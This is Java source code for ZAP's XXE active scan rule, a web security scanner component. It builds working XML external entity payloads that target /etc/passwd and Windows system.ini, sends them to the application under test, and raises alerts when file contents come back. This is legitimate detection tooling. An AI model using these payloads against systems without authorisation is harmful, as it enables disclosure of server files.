/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2014 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrulesBeta;

import java.io.IOException;
import java.text.MessageFormat;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.control.Control;
import org.parosproxy.paros.core.scanner.AbstractAppPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.network.HttpHeader;
import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.addon.commonlib.CommonAlertTag;
import org.zaproxy.addon.oast.ExtensionOast;
import org.zaproxy.zap.model.Vulnerabilities;
import org.zaproxy.zap.model.Vulnerability;

/**
 * https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
 *
 * @author yhawke (2104)
 */
public class XxeScanRule extends AbstractAppPlugin {

    private static final String MESSAGE_PREFIX = "ascanbeta.xxe.";
    private static final int PLUGIN_ID = 90023;

    // Get the correct vulnerability description from WASC
    private static final Vulnerability vuln = Vulnerabilities.getVulnerability("wasc_43");
    private static final Map<String, String> ALERT_TAGS =
            CommonAlertTag.toMap(
                    CommonAlertTag.OWASP_2021_A03_INJECTION,
                    CommonAlertTag.OWASP_2017_A04_XXE,
                    CommonAlertTag.WSTG_V42_INPV_07_XMLI);

    // Payload built on examples retrieved in:
    // https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
    private static final String ATTACK_ENTITY = "&zapxxe;";

    static final String ATTACK_HEADER =
            "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n"
                    + "<!DOCTYPE foo [\n"
                    + "  <!ELEMENT foo ANY >\n"
                    + "  <!ENTITY zapxxe SYSTEM \"{0}\">\n"
                    + "]>\n";

    protected static final String ATTACK_BODY = "<foo>" + ATTACK_ENTITY + "</foo>";

    protected static final String ATTACK_MESSAGE = ATTACK_HEADER + ATTACK_BODY;

    // XML standard from W3C Consortium
    // ---------------------------------------------
    // STag ::= '<' Name (S Attribute)* S? '>'
    // NameStartChar ::= ":" | [A-Z] | "_" | [a-z] | [#xC0-#xD6] | [#xD8-#xF6] | [#xF8-#x2FF] |
    // [#x370-#x37D] | [#x37F-#x1FFF] | [#x200C-#x200D] | [#x2070-#x218F] | [#x2C00-#x2FEF] |
    // [#x3001-#xD7FF] | [#xF900-#xFDCF] | [#xFDF0-#xFFFD] | [#x10000-#xEFFFF]
    // NameChar ::= NameStartChar | "-" | "." | [0-9] | #xB7 | [#x0300-#x036F] | [#x203F-#x2040]
    // Name ::= NameStartChar (NameChar)*
    // S ::= (0x20 0x09 0x0d 0x0a)+ in Java (\s)
    // Attribute ::= Name Eq AttValue
    // Eq ::= S? '=' S?
    // AttValue ::= '"' ([^<&"] | Reference)* '"' |  "'" ([^<&'] | Reference)* "'"
    // ----------------------------------------------
    private static final String tagRegex =
            "\\<[\\_\\:A-Za-z][\\_\\:A-Za-z0-9\\-\\.]*\\s*[^\\>]*\\>((?:\\<\\!\\[CDATA\\[(?:.(?<!\\]\\]>))*\\]\\]>)|(?:[^\\<\\&]*))\\<\\/[\\_\\:A-Za-z][\\_\\:A-Za-z0-9\\-\\.]*\\s*\\>";
    static final Pattern tagPattern = Pattern.compile(tagRegex);

    // Local targets for local file inclusion
    private static final String[] LOCAL_FILE_TARGETS = {
        "file:///etc/passwd", "file:///c:/Windows/system.ini", "file:///d:/Windows/system.ini"
    };

    private static final Pattern[] LOCAL_FILE_PATTERNS = {
        Pattern.compile("root:.:0:0"),
        Pattern.compile("\\[drivers\\]"),
        Pattern.compile("\\[drivers\\]")
    };

    private static final String xmlHeaderRegex = "<\\?xml.*?\\?>";
    private static final Pattern xmlHeaderPattern =
            Pattern.compile(xmlHeaderRegex, Pattern.CASE_INSENSITIVE);

    // Logger instance
    private static final Logger log = LogManager.getLogger(XxeScanRule.class);

    @Override
    public int getId() {
        return PLUGIN_ID;
    }

    @Override
    public String getName() {
        return Constant.messages.getString(MESSAGE_PREFIX + "name");
    }

    @Override
    public String getDescription() {
        if (vuln != null) {
            return vuln.getDescription();
        }
        return "Failed to load vulnerability description from file";
    }

    @Override
    public int getCategory() {
        return Category.INJECTION;
    }

    @Override
    public String getSolution() {
        if (vuln != null) {
            return vuln.getSolution();
        }

        return "Failed to load vulnerability solution from file";
    }

    @Override
    public String getReference() {
        if (vuln != null) {
            StringBuilder sb = new StringBuilder();
            for (String ref : vuln.getReferences()) {
                if (sb.length() > 0) {
                    sb.append('\n');
                }

                sb.append(ref);
            }

            return sb.toString();
        }

        return "Failed to load vulnerability reference from file";
    }

    @Override
    public int getCweId() {
        return 611;
    }

    @Override
    public int getWascId() {
        return 43;
    }

    @Override
    public Map<String, String> getAlertTags() {
        return ALERT_TAGS;
    }

    @Override
    public int getRisk() {
        return Alert.RISK_HIGH;
    }

    /**
     * Scan rule to check for XXE vulnerabilities. It checks both for local and remote using the ZAP
     * API and also a new model based on parameter substitution
     */
    @Override
    public void scan() {
        // Prepare the message
        HttpMessage msg = getBaseMsg();
        String contentType = msg.getRequestHeader().getHeader(HttpHeader.CONTENT_TYPE);

        // first check if it's an XML otherwise it's useless...
        if ((contentType != null) && (contentType.contains("xml"))) {

            // Check #1 : XXE Remote File Inclusion Attack
            remoteFileInclusionAttack();

            // Check #2 : Out-of-band XXE Attack
            outOfBandFileInclusionAttack();

            // Check if we've to do only basic analysis (only remote should be done)...
            if (this.getAttackStrength() == AttackStrength.LOW) {
                return;
            }

            // Check #3 : XXE Local File Reflection Attack
            localFileReflectionAttack(getNewMsg());

            // Check if we've to do only medium sized analysis
            // (only remote and reflected will be done)
            if (this.getAttackStrength() == AttackStrength.MEDIUM) {
                return;
            }

            // Exit if the scan has been stopped
            if (isStop()) {
                return;
            }

            // Check #4 : XXE Local File Inclusion Attack
            localFileInclusionAttack(getNewMsg());
        }
    }

    /**
     * This attack is described in
     * https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing using an
     * external bouncing site, in this case we use the ZAP API as a server for the vulnerability
     * check using a challenge/response model based on a random string
     */
    private void remoteFileInclusionAttack() {
        try {
            ExtensionOast extOast =
                    Control.getSingleton().getExtensionLoader().getExtension(ExtensionOast.class);
            if (extOast != null && extOast.getCallbackService() != null) {
                HttpMessage msg = getNewMsg();
                Alert alert =
                        newAlert()
                                .setConfidence(Alert.CONFIDENCE_MEDIUM)
                                .setMessage(msg)
                                .setSource(Alert.Source.ACTIVE)
                                .build();
                String callbackPayload =
                        extOast.registerAlertAndGetPayloadForCallbackService(
                                alert, XxeScanRule.class.getSimpleName());
                String payload = MessageFormat.format(ATTACK_MESSAGE, callbackPayload);
                alert.setAttack(payload);
                msg.setRequestBody(payload);
                sendAndReceive(msg);
            }
        } catch (Exception e) {
            log.warn("Could not perform Remote File Inclusion Attack.", e);
        }
    }

    private void outOfBandFileInclusionAttack() {
        try {
            ExtensionOast extOast =
                    Control.getSingleton().getExtensionLoader().getExtension(ExtensionOast.class);
            if (extOast != null && extOast.getActiveScanOastService() != null) {
                HttpMessage msg = getNewMsg();
                Alert alert =
                        newAlert()
                                .setConfidence(Alert.CONFIDENCE_MEDIUM)
                                .setMessage(msg)
                                .setSource(Alert.Source.ACTIVE)
                                .build();
                String oastPayload = extOast.registerAlertAndGetPayload(alert);
                String payload = MessageFormat.format(ATTACK_MESSAGE, "http://" + oastPayload);
                alert.setAttack(payload);
                msg.setRequestBody(payload);
                sendAndReceive(msg);
                // Try again with https
                msg = getNewMsg();
                payload = MessageFormat.format(ATTACK_MESSAGE, "https://" + oastPayload);
                msg.setRequestBody(payload);
                sendAndReceive(msg);
            }
        } catch (Exception e) {
            log.warn("Could not perform OOB XXE File Inclusion Attack.", e);
        }
    }

    /**
     * Local File Reflection Attack initially substitutes every attribute in the original XML
     * request with a fake entity which includes a sensitive local file. The attack is repeated for
     * every file listed in the LOCAL_FILE_TARGETS. The response returned is pattern matched against
     * LOCAL_FILE_PATTERNS. An alert is raised when a match is found. If no alert is raised, then
     * the process is repeated by replacing one attribute at a time, for a fixed number of
     * attributes depending on the strength of the rule.
     *
     * @param msg new HttpMessage with the same request as the base. This is used to build the
     *     attack payload.
     */
    private void localFileReflectionAttack(HttpMessage msg) {
        // First replace the values in all the Elements by the Attack Entity
        String originalRequestBody = msg.getRequestBody().toString();
        String requestBody = createLfrPayload(originalRequestBody);
        if (localFileReflectionTest(msg, requestBody)) {
            return;
        }
        // Now if no issue is found yet, then we replace the values one at a time. Do this for a
        // fixed number of Elements, depending on the strength at which the rule is used.

        // Remove original xml header
        Matcher headerMatcher = xmlHeaderPattern.matcher(originalRequestBody);
        String headerlessRequestBody = headerMatcher.replaceAll("");
        int maxValuesChanged = 0;

        if (this.getAttackStrength() == AttackStrength.MEDIUM) {
            maxValuesChanged = 72 / LOCAL_FILE_TARGETS.length;
        } else if (this.getAttackStrength() == AttackStrength.HIGH) {
            maxValuesChanged = 144 / LOCAL_FILE_TARGETS.length;
        } else if (this.getAttackStrength() == AttackStrength.INSANE) {
            maxValuesChanged = Integer.MAX_VALUE;
        }
        Matcher tagMatcher = tagPattern.matcher(headerlessRequestBody);
        for (int tagIdx = 1; (tagIdx <= maxValuesChanged) && tagMatcher.find(); tagIdx++) {
            requestBody = createTagSpecificLfrPayload(headerlessRequestBody, tagMatcher);
            if (localFileReflectionTest(msg, requestBody)) {
                return;
            }
        }
    }

    /**
     * Local File Inclusion Attack is described in
     * https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing. The
     * attack builds a payload for every file listed in LOCAL_FILE_TARGETS with the ATTACK_HEADER
     * and the ATTACK_BODY. The response returned is pattern matched against LOCAL_FILE_PATTERNS. An
     * alert is raised when a match is found.
     *
     * <p>This situation is very uncommon because it works only in case of a bare XML parser which
     * execute the content and then returns the content almost untouched (maybe because it applies
     * an XSLT or query it using XPath and give back the result)
     *
     * @param msg new HttpMessage with the same request as the base. This is used to build the
     *     attack payload.
     */
    private void localFileInclusionAttack(HttpMessage msg) {
        String payload = null;
        try {
            for (int idx = 0; idx < LOCAL_FILE_TARGETS.length; idx++) {
                String localFile = LOCAL_FILE_TARGETS[idx];
                payload = MessageFormat.format(ATTACK_MESSAGE, localFile);
                msg.setRequestBody(payload);
                sendAndReceive(msg);
                String response = msg.getResponseBody().toString();
                Matcher matcher = LOCAL_FILE_PATTERNS[idx].matcher(response);
                if (matcher.find()) {
                    newAlert()
                            .setConfidence(Alert.CONFIDENCE_MEDIUM)
                            .setAttack(payload)
                            .setEvidence(matcher.group())
                            .setMessage(msg)
                            .raise();
                }
                if (isStop()) {
                    return;
                }
            }
        } catch (IOException ex) {
            // Do not try to internationalise this.. we need an error message in any event..
            // if it's in English, it's still better than not having it at all.
            log.warn(
                    "XXE Injection vulnerability check failed for payload [{}] due to an I/O error",
                    payload,
                    ex);
        }
    }

    static String createLfrPayload(String requestBody) {
        StringBuilder sb = new StringBuilder(ATTACK_HEADER);

        // Remove original xml header
        Matcher headerMatcher = xmlHeaderPattern.matcher(requestBody);
        requestBody = headerMatcher.replaceAll("");

        // Replace all values in Elements with Attack Entity
        Matcher matcher = tagPattern.matcher(requestBody);
        int endIdx = 0;

        while (matcher.find()) {
            sb.append(requestBody.substring(endIdx, matcher.start(1)));
            sb.append(ATTACK_ENTITY);
            endIdx = matcher.end(1);
        }
        sb.append(requestBody.substring(endIdx));
        return sb.toString();
    }

    private boolean localFileReflectionTest(HttpMessage msg, String requestBody) {
        for (int idx = 0; idx < LOCAL_FILE_TARGETS.length; idx++) {
            String localFile = LOCAL_FILE_TARGETS[idx];
            String payload = MessageFormat.format(requestBody, localFile);
            msg.setRequestBody(payload);
            try {
                sendAndReceive(msg);
            } catch (IOException ex) {
                log.warn(
                        "XXE Injection vulnerability check failed for payload [{}] due to an I/O error",
                        payload,
                        ex);
                return true;
            }
            String response = msg.getResponseBody().toString();
            Matcher matcher = LOCAL_FILE_PATTERNS[idx].matcher(response);
            if (matcher.find()) {
                newAlert()
                        .setConfidence(Alert.CONFIDENCE_MEDIUM)
                        .setAttack(payload)
                        .setEvidence(matcher.group())
                        .setMessage(msg)
                        .raise();
                return true;
            }
            if (isStop()) {
                return true;
            }
        }
        return false;
    }

    static String createTagSpecificLfrPayload(String requestBody, Matcher tagMatcher) {
        StringBuilder sb = new StringBuilder(ATTACK_HEADER);
        sb.append(requestBody.substring(0, tagMatcher.start(1)));
        sb.append(ATTACK_ENTITY);
        sb.append(requestBody.substring(tagMatcher.end(1)));
        return sb.toString();
    }
}
